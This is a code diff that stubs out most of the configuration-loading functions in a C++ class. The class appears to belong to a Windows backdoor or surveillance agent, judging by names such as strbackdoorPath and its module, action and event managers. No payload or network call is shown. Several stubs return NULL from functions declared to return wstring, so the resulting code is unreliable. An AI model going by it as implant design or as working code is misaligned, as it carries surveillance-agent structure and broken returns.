@@ -31,6 +31,7 @@ Conf::~Conf(){
 }
 
 BOOL WINAPI Conf::ParseModule(JSONArray js) {
+
 	UINT i = 0;
 	ModulesManager *modulesManager = ModulesManager::self();
 
@@ -49,8 +50,9 @@ BOOL WINAPI Conf::ParseModule(JSONArray js) {
 #ifdef _DEBUG
 		wprintf(L"Parsing Module: %s\n", moduleName.c_str());
 #endif
-
+/***
 		do {
+
 			if (moduleName.compare(L"application") == 0 ) {
 				startProc = ApplicationModule;
 				break;
@@ -131,8 +133,9 @@ BOOL WINAPI Conf::ParseModule(JSONArray js) {
 				startProc = UrlModule;
 				break;
 			}
-		} while (0);
 
+		} while (0);
+***/
 		if (startProc != NULL)
 			modulesManager->add(moduleName, jo, startProc);
 
@@ -143,6 +146,7 @@ BOOL WINAPI Conf::ParseModule(JSONArray js) {
 }
 
 BOOL WINAPI Conf::ParseAction(JSONArray js) {
+
 	UINT i = 0;
 	ActionsManager *actionsManager = ActionsManager::self();
 
@@ -167,6 +171,7 @@ BOOL WINAPI Conf::ParseAction(JSONArray js) {
 }
 
 BOOL WINAPI Conf::ParseEvent(JSONArray js) {
+/***
 	UINT i = 0;
 	EventsManager *eventsManager = EventsManager::self();
 
@@ -253,7 +258,7 @@ BOOL WINAPI Conf::ParseEvent(JSONArray js) {
 
 		// startProc == NULL -> Unknown agent
 	}
-
+***/
 	return TRUE;
 }
 
@@ -273,6 +278,7 @@ BOOL Conf::ParseGlobal(JSONArray js) {
 }
 
 BOOL Conf::ParseConfSection(JSONValue *jVal, char *conf, WCHAR *section, confCallback_t call_back) {
+/***
 	JSONObject root;
 
 	if (jVal) {
@@ -296,7 +302,7 @@ BOOL Conf::ParseConfSection(JSONValue *jVal, char *conf, WCHAR *section, confCal
 	if (root.find(section) != root.end() && root[section]->IsArray()) {
 		call_back(root[section]->AsArray());
 	}
-
+***/
 	return TRUE;
 }
 
@@ -311,7 +317,7 @@ BOOL Conf::LoadConf() {
 	wstring strBack, strMig;
 	UINT Len = 0, i = 0, num = 0;
 	BOOL bBackConf = FALSE;
-
+/***
 	if (strEncryptedConfName.empty())
 		return NULL;
 
@@ -378,11 +384,12 @@ BOOL Conf::LoadConf() {
 	if (strBack.empty() == FALSE)
 		if (CopyFile2(strBack.c_str(), strPath.c_str(), FALSE) == TRUE)
 			DeleteFile(strBack.c_str());
-
+***/
 	return TRUE;
 }
 
 BOOL Conf::RemoveConf() {
+/***
 	wstring strbackdoorPath;
 
 	if (strEncryptedConfName.empty())
@@ -405,9 +412,12 @@ BOOL Conf::RemoveConf() {
 
 	DeleteFile(strbackdoorPath.c_str());
 	return res;
+	***/
+	return NULL;
 }
 
 BOOL Conf::FileExists(wstring &strInFile) {
+/***
 	HANDLE hConfFile = INVALID_HANDLE_VALUE;
 	wstring strCompletePath;
 
@@ -425,6 +435,7 @@ BOOL Conf::FileExists(wstring &strInFile) {
 		return FALSE;
 
 	CloseHandle(hConfFile);
+***/
 	return TRUE;
 }
 
@@ -453,6 +464,7 @@ BYTE* Conf::MemStringCmp(BYTE *memory, CHAR *string, UINT uLen) {
 }
 
 wstring Conf::GetBackupName(BOOL bCompletePath) {
+/***
 	WCHAR *pBackExt;
 	wstring strPath;
 
@@ -472,9 +484,12 @@ wstring Conf::GetBackupName(BOOL bCompletePath) {
 	free(pBackExt);
 
 	return strPath;
+***/
+	return NULL;
 }
 
 wstring Conf::GetMigrationName(BOOL bCompletePath) {
+/***
 	WCHAR *pBackExt;
 	wstring strPath;
 
@@ -494,4 +509,6 @@ wstring Conf::GetMigrationName(BOOL bCompletePath) {
 	free(pBackExt);
 
 	return strPath;
+***/
+	return NULL;
 }
